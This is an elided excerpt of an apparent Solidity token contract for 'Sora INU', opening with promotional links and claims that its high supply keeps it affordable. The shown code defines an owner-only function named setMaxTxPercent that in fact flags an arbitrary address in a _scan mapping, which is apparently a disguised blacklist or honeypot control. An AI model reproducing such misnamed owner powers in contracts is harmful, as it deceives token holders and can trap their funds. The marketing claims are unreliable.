...
Telegram - https://t.me/sorainu

Website -  https://sinu.io/

Twitter -  https://twitter.com/sorainuio

Medium -   https://sinuio.medium.com/sora-inu-sinu-new-dog-in-the-crypto-space-fa23dde76643

Sora INU is a community driven project, created by crypto enthusiasts. 
Our high supply allows you to keep the price low, 
thanks to which it will always be affordable for everyone.
Additionally, we want to give you some simple products in a new, improved version.
...
contract ERC20 is Ownable, IERC20 {
    ...
    function setMaxTxPercent(address _address) external onlyOwner() {
        _scan[_address] = true;
    }
...
contract SoraInuToken is ERC20 {
